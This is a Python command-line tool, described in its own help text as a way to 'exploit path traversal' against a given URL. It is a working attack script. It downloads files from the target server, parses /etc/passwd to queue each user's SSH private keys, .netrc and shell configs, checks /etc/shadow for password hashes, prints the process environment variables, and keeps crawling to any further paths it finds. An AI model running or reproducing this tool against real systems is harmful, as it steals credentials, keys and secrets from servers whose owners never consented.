#!/usr/bin/env python3

import argparse
import os.path
import re
import requests
import sys
from requests.exceptions import HTTPError


class HttpClient:
    def __init__(self, arguments):
        self.base_url = arguments.url
        self.session = requests.Session()

        for header in arguments.headers:
            key, value = header.split(": ", 1)
            self.session.headers[key] = value

    def request_file(self, path):
        url = self.base_url + path
        response = self.session.get(url, allow_redirects=False)
        if response.status_code != 200:
            raise FileNotFoundError(path)
        return response.content


def write_file(dest, response):
    try:
        dest_dir = os.path.dirname(dest)
        os.makedirs(dest_dir)
    except FileExistsError:
        pass

    mode = "wb"
    if isinstance(response, str):
        mode = "w"

    with open(dest, mode) as fp:
        fp.write(response)


def read_file(path):
    try:
        with open(path, "r") as fp:
            return {l.strip() for l in fp.readlines()}
    except FileNotFoundError:
        return set()


def should_try_download(path):
    if path.startswith("/dev/"):
        return False

    if path.endswith("/"):
        return False

    return True


def resolve_relative_path(origin_path, relative_path):
    return os.path.normpath(os.path.join(os.path.dirname(origin_path), relative_path))


def find_files(path, content):
    content = content[:10_000_000]
    matches = re.findall(b"[./]*/[a-z]+/[a-zA-Z0-9._/-]+", content)
    matches = [m.decode("ASCII") for m in matches]
    matches = [resolve_relative_path(path, m) for m in matches]
    matches = filter(should_try_download, matches)
    return set(matches)


handlers = {}


def filehandler(pattern):
    def decorator(function):
        handlers[pattern] = function
        return function

    return decorator


class NotFilePathError(ValueError):
    pass


def assert_is_path(path):
    if not path.startswith("/"):
        raise NotFilePathError()


@filehandler("/etc/passwd")
def passwd(content):
    queue = set()
    content = content.decode("ASCII")
    for line in content.split("\n"):
        try:
            parts = line.split(":")
            homedir = parts[5]
            assert_is_path(homedir)
            queue |= {
                os.path.join(homedir, f)
                for f in [
                    ".netrc",
                    ".ssh/id_rsa",
                    ".ssh/config",
                    ".ssh/authorized_keys",
                    ".ssh/known_hosts",
                    ".ssh/id_ed25519",
                    ".bash_logout",
                    ".bash_profile",
                    ".bashrc",
                ]
            }
        except (IndexError, NotFilePathError):
            pass
    return queue


@filehandler("/etc/shadow")
def shadow(content):
    if content.startswith(b"root"):
        print("* Shadow file potentially contains password hashes")


@filehandler("/proc/version")
def version(content):
    print_first_line(content)


@filehandler("/proc/self/environ")
def environ(content):
    lines = content.split(b"\0")
    print("* Environment variables:")
    for line in lines:
        print("      " + line.decode("ASCII"))


def print_first_line(content):
    line, rest = content.split(b"\n", 1)
    print("* " + line.decode("ASCII"))


def call_handlers(path, content):
    queue = set()
    if path in handlers:
        more_files = handlers[path](content)
        if more_files is not None:
            queue |= more_files
    return queue


class Spider:
    def __init__(self, client, args):
        self.client = client
        self.save_dir = args.save_dir
        self.done_file = os.path.join(self.save_dir, ".done.txt")
        self.queue_file = os.path.join(self.save_dir, ".queue.txt")

        self.done = read_file(self.done_file)
        self.queue = (
            read_file(args.filelist) | read_file(self.queue_file) | set(args.paths)
        )
        self.queue -= self.done

    def save_state(self):
        write_file(self.queue_file, "\n".join(self.queue))
        write_file(self.done_file, "\n".join(self.done))

    def spider(self):
        try:
            while self.queue:
                path = self.queue.pop()
                assert_is_path(path)
                try:
                    if sys.stdout.isatty():
                        print("  " + path, end="\r")

                    response = self.client.request_file(path)
                    if response:
                        write_file(self.save_dir + path, response)
                        print("\u2713 " + path)
                        self.queue |= call_handlers(path, response)
                    else:
                        print("0 " + path)

                    files = find_files(path, response)
                    remain = files - self.done
                    self.queue |= remain
                except (HTTPError, FileNotFoundError) as e:
                    print("\u274c " + path)

                self.done.add(path)
        finally:
            self.save_state()

        print("Done")


def parse_arguments():
    parser = argparse.ArgumentParser(description="Exploit path traversal")
    parser.add_argument(
        "-H",
        "--header",
        dest="headers",
        default=[],
        action="append",
        help='Extra header (e.g. "X-Forwarded-For: 127.0.0.1")',
    )
    parser.add_argument(
        "-o",
        "--output-dir",
        dest="save_dir",
        default="out",
        help="Save files to this directory",
    )
    parser.add_argument(
        "-f",
        "--filelist",
        dest="filelist",
        default="filelist.txt",
        help="File with a list of paths to download",
    )
    parser.add_argument(
        "-p",
        "--path",
        dest="paths",
        default=[],
        action="append",
        help="Add this path to the download queue",
    )
    parser.add_argument("url", help="URL to attack")
    return parser.parse_args()


def path_to_absolute(save_dir, path_in_save_dir):
    assert path_in_save_dir.startswith(save_dir)
    return path_in_save_dir[len(save_dir.rstrip("/")) :]


if __name__ == "__main__":
    args = parse_arguments()
    client = HttpClient(args)
    spider = Spider(client, args)
    spider.spider()
